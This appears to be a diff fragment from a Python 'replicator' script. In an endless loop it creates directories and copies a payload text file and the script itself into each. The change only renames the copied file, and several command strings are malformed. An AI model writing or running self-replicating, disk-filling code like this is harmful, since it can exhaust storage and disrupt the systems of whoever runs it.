@@ -40,7 +40,7 @@ while x==1:
 	#Makes a new new directory within the original folder called: clone
 	os.mkdir(gen_hex_colour_code())
 	#Runs a copy command where the Payload text file is copied to the newly made directory
-	os.system(r'copy kurwa.txt' 'gen_hex_colour_code()')
+	os.system(r'copy textfile.txt' 'gen_hex_colour_code()')
 	#Runs a copy command where the "replicator.py" is copied but it gets the name of the script from the ARGV
 	#library that we imported. It gets that from the last inputted CMD command when this file was first started.
 	os.system(r'copy ' + name + 'gen_hex_colour_code()')
